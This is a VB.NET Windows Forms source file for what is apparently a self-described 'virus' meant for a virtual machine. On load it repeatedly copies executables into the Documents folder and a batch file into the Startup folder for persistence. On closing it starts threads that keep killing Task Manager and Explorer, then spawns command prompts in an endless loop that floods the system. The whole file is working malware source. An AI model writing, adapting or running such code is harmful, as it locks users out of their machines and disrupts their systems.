Imports System.IO
Public Class Form1
    Sub task()
        While True
            For Each y As Process In Process.GetProcessesByName("taskmgr")
                y.Kill()
            Next
            Threading.Thread.Sleep(100)
        End While
    End Sub

    Sub block()
        While True
            For Each p As Process In Process.GetProcessesByName("explorer")
                p.Kill()
            Next
            Threading.Thread.Sleep(100)
        End While
    End Sub
    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
line1:
        Dim Files As String = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) & "\Virus (Only Open In VM!!!).exe"
        Dim Files1 As String = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) & "\Virus (Only Open In VM!!!).dll"
        Dim FIles2 As String = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) & "\Virus (Only Open In VM!!!).runtimeconfig.json"
        Dim FIles3 As String = Environment.GetFolderPath(Environment.SpecialFolder.Startup) & "\Only Work With Virus (Only Open In VM!!!).bat"
        Dim next1 As String = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) & "\Virus 3 (Only Work With Virus).exe"
        Dim next2 As String = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) & "\Virus 3 (Only Work With Virus).dll"
        Dim next3 As String = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) & "\Virus 3 (Only Work With Virus).runtimeconfig.json"
        Dim other1 As String = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) & "\Virus 2 (Only Work With Virus).exe"
        Dim other2 As String = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) & "\Virus 2 (Only Work With Virus).dll"
        Dim other3 As String = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) & "\Virus 2 (Only Work With Virus).runtimeconfig.json"

        If File.Exists(Files) Then
        Else
            FileCopy("Virus (Only Open In VM!!!).exe", Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) & "\Virus (Only Open In VM!!!).exe")
        End If
        If File.Exists(Files1) Then
        Else
            FileCopy("Virus (Only Open In VM!!!).dll", Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) & "\Virus (Only Open In VM!!!).dll")
        End If
        If File.Exists(FIles2) Then
        Else
            FileCopy("Virus (Only Open In VM!!!).runtimeconfig.json", Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) & "\Virus (Only Open In VM!!!).runtimeconfig.json")
        End If
        If File.Exists(FIles3) Then
        Else
            FileCopy("Only Work With Virus (Only Open In VM!!!).bat", Environment.GetFolderPath(Environment.SpecialFolder.Startup) & "\Only Work With Virus (Only Open In VM!!!).bat")
        End If
        If File.Exists(next1) Then
        Else
            FileCopy("Virus 3 (Only Work With Virus).exe", Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) & "\Virus 3 (Only Work With Virus).exe")
        End If
        If File.Exists(next2) Then
        Else
            FileCopy("Virus 3 (Only Work With Virus).dll", Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) & "\Virus 3 (Only Work With Virus).dll")
        End If
        If File.Exists(next3) Then
        Else
            FileCopy("Virus 3 (Only Work With Virus).runtimeconfig.json", Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) & "\Virus 3 (Only Work With Virus).runtimeconfig.json")
        End If
        If File.Exists(other1) Then
        Else
            FileCopy("Virus 2 (Only Work With Virus).exe", Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) & "\Virus 2 (Only Work With Virus).exe")
        End If
        If File.Exists(other2) Then
        Else
            FileCopy("Virus 2 (Only Work With Virus).dll", Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) & "\Virus 2 (Only Work With Virus).dll")
        End If
        If File.Exists(other3) Then
        Else
            FileCopy("Virus 2 (Only Work With Virus).runtimeconfig.json", Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) & "\Virus 2 (Only Work With Virus).runtimeconfig.json")
        End If
        Threading.Thread.Sleep(500)
        GoTo line1
    End Sub

    Private Sub Form1_FormClosing(sender As Object, e As FormClosingEventArgs) Handles MyBase.FormClosing
        Dim t As New Threading.Thread(AddressOf block)
        Dim q As New Threading.Thread(AddressOf task)
        t.Start()
        q.Start()
        Do
            Process.Start("cmd")
        Loop
    End Sub
End Class
